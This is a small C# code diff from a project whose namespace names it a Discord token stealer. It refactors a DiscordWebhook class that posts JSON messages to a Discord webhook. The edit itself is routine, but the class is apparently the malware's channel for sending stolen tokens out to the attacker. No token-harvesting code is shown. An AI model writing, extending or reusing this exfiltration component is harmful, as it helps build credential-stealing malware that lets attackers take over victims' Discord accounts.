@@ -3,7 +3,7 @@ using System.Net.Http.Json;
 
 namespace DiscordTokenStealer.Discord;
 
-public sealed class DiscordWebhook : IDisposable
+public class DiscordWebhook : IDisposable
 {
     private readonly HttpClient _client;
     public DiscordWebhook(string id, string token)
@@ -14,7 +14,7 @@ public sealed class DiscordWebhook : IDisposable
         };
     }
 
-    public async Task SendMessage(DiscordMessage message)
+    public async Task SendMessage<TMessage>(TMessage message) where TMessage : DiscordMessage
     {
         using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
         response.EnsureSuccessStatusCode();
